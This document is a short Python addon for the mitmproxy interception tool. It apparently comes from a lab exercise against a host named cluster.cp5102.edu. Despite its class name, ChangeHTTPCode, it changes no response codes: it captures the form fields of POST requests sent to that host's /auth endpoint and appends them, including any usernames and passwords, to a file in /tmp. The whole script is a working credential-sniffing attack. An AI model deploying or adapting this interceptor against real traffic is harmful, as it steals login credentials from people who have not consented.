from mitmproxy import http
from mitmproxy import ctx

class ChangeHTTPCode:
    filter = "cluster.cp5102.edu/auth"

    def request(self, flow: http.HTTPFlow) -> None:
      if flow.request and flow.request.method == 'POST':
        if (self.filter in flow.request.pretty_url):
          f = open("/tmp/response", "a")
          f.write(str(flow.request.urlencoded_form))
          f.close()

addons = [ChangeHTTPCode()]
